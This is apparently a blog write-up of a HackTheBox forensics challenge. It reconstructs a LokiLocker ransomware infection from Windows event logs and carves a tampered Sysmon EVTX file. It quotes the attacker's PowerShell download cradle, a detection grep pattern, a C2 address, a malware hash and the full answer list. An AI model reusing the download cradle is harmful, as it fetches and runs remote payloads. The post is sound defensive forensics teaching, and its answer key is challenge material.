---
layout: post
title: "HackTheBox Challenge: Valhalloween"
date: 2027-09-27 09:00:00 -0500
categories: [HackTheBox, Challenges, Forensics]
tags: [hackthebox, challenge, forensics, dfir, windows-event-logs, sysmon, evtx, evtx-tampering, anti-forensics, ransomware, lokilocker, incident-response]
---

Valhalloween is a forensics challenge built around a single idea: take a folder
of Windows event logs from a ransomware-infected machine and **reconstruct the
infection chain, root to payload.** A Docker oracle asks seven sequential
questions over `nc`; each one is a node in that chain, and answering all seven in
one connection prints the flag.

## Overview

You plug in a "candy" USB and your files get encrypted. You're handed a `Logs/`
directory of ~360 `.evtx` files and a `nc` endpoint. The work is pure DFIR — no
exploitation — and the entire solve is reading the right four channels:
PowerShell Operational, Sysmon, Task Scheduler, and a quick VirusTotal lookup.

## The technique

A ransomware execution leaves a readable trail across separate Windows logs. The
challenge mirrors a real triage:

```
WINWORD.EXE (7280)  opens  C:\Users\HoaGay\Documents\Subjects\Unexpe.docx   <- root maldoc
   └─ cmd.exe (8776)
        └─ powershell.exe (3856)   <- download cradle
             └─ mscalc.exe (7528)  <- the ransomware (LokiLocker), schedules task "Loki"
```

Where each fact lives:

- **C2 download server** — `Microsoft-Windows-PowerShell/Operational` ScriptBlock
  logging (EID 4104) captures the cradle verbatim:
  `(new-object system.net.webclient).downloadfile('http://<ip>:<port>/mscalc.exe',...)`.
- **Payload MD5** — Sysmon **EID 1 (ProcessCreate)** `Hashes` field. This is only
  recoverable because the attacker installed Sysmon with `-h md5` — visible in the
  same PowerShell log (`.\Sysmon64.exe -i -accepteula -h md5 -n`). The hash drives
  a VirusTotal lookup for the **family label** (`lokilocker`).
- **Persistence task** — `Microsoft-Windows-TaskScheduler/Operational` EID 106,
  task registered as a child of `mscalc.exe`.
- **Root of the chain** — walk Sysmon EID 1 by `ParentProcessId` upward until you
  reach `WINWORD.EXE` opening the malicious `.docx`; the first-open time comes
  from that record's `UtcTime`.

## Solution

Kali's `evtx_dump` **CLI** is broken on current builds (`ModuleNotFoundError:
'scripts'`, emits 0 records). Use the **python-evtx** library to dump every log,
then grep the high-signal fields:

```python
import glob, re
from Evtx.Evtx import Evtx

PATTERNS = re.compile(
    r'downloadfile|Invoke-WebRequest|Hashes|MD5=|ParentProcessId|ParentImage|mscalc',
    re.I)

for f in sorted(glob.glob('Logs/*.evtx')):
    with Evtx(f) as e:
        for rec in e.records():
            for line in rec.xml().splitlines():
                if PATTERNS.search(line):
                    print(f, '|', line.strip()[:200])
```

That surfaces the PowerShell download cradle (C2 + filename) immediately — but
the Sysmon payload hash is hidden behind a trap.

## The catch: a tampered EVTX header

Dump `Microsoft-Windows-Sysmon%4Operational.evtx` with the loop above and it
appears to **end at the `03:00:19` boot** — yet the ransomware ran at `03:03`.
The `mscalc.exe` ProcessCreate (and its MD5) is simply not in the output. The
file's **header was edited** so parsers stop early: `next_record` is garbage and
the declared `chunk_count` is `41`, while the file physically contains **62
`ElfChnk\x00` chunks** across its 4.2 MB. `python-evtx`'s `records()` /
`chunks()`, and Windows Event Viewer, all trust the header and skip the 21 chunks
that hold the entire attack.

Confirm the tamper, then ignore the header and carve every chunk directly:

```python
import re, struct
from Evtx.Evtx import ChunkHeader

data = open("Logs/Microsoft-Windows-Sysmon%4Operational.evtx", "rb").read()
print("declared:", struct.unpack_from("<H", data, 0x2A)[0],
      "real:", len(re.findall(b"ElfChnk\x00", data)))     # -> declared: 41 real: 62

for off in [m.start() for m in re.finditer(b"ElfChnk\x00", data)]:
    for rec in ChunkHeader(data, off).records():          # bypass the lying header
        print(rec.xml())
```

Plain `records()` returned 2719 records ending at boot; the carve returns 4098
records through `03:04:42`, with `mscalc.exe` appearing 44 times — including the
EID 1 `Hashes` field carrying the MD5. **Heuristic:** any multi-MB EVTX that
yields only a few thousand records ending suspiciously at a boot is a tamper
candidate — carve `ElfChnk` signatures rather than trusting the header.

With the hash recovered, the oracle is answered with a small pwntools replay
harness — because each connection is **fresh**, every prior answer must be resent
each run:

```python
from pwn import remote

ANSWERS = [
    "103.162.14.116:8888",                                    # 1 C2 IP:port
    "b94f3ff666d9781cb69088658cd53772",                       # 2 ransomware MD5
    "lokilocker",                                             # 3 family label
    "Loki",                                                  # 4 scheduled task
    "powershell.exe_3856",                                    # 5 parent name_ID
    r"C:\Users\HoaGay\Documents\Subjects\Unexpe.docx",        # 6 initial stage
    "2023-09-20_03:03:20",                                    # 7 first-open UTC
]

r = remote(HOST, PORT)
for a in ANSWERS:
    r.recvuntil(b'>')
    r.sendline(a.encode())
print(r.recvall().decode())   # -> [+] Here is the flag: HTB{...}
```

All seven correct yields the flag (`HTB{...}`, redacted).

## Why it worked

Ransomware that uses a living-off-the-land PowerShell cradle and a maldoc parent
is *loud* if the right logging is on. ScriptBlock logging records the exact
download URL; Sysmon EID 1 records the payload hash and the full parent/child
process tree; Task Scheduler EID 106 records the persistence. The challenge's
question set is literally the infection chain walked backwards — there is no
secret to crack, only the discipline to read the correct channel for each fact.

## Fix / defense

- **Block Office macros from the internet** (Mark-of-the-Web enforcement) to kill
  the `WINWORD → cmd → powershell` root.
- **PowerShell Constrained Language Mode + AMSI + ScriptBlock logging** so cradles
  are both harder to run and fully logged.
- **AppLocker / WDAC** to stop executables launching from `%TEMP%`
  (`mscalc.exe` ran from the user's temp folder).
- **Deploy Sysmon defensively and forward EID 1 / 4104 / TaskScheduler 106 to a
  SIEM** with download-cradle and new-scheduled-task detections — the same
  artifacts that solved this challenge are what catch the real thing.
